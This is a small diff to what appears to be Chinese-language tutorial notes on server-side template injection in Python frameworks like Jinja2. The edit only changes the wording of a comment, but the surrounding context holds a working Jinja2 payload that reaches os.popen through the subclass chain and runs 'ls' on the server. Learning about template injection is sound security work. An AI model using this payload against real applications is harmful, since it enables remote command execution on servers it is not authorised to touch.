@@ -19,7 +19,7 @@ ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty 
 控制块 {百分号%}  可以声明变量，也可以执行语句 //这个标签会造成GitHub报错，所以用文字替换了
 {% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{百分号 print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}
 
-行声明 ##    可以有和{%%}相同的效果
+行声明 ##    可以有和{百分号%}相同的效果
 ```
 
 ### 常用方法
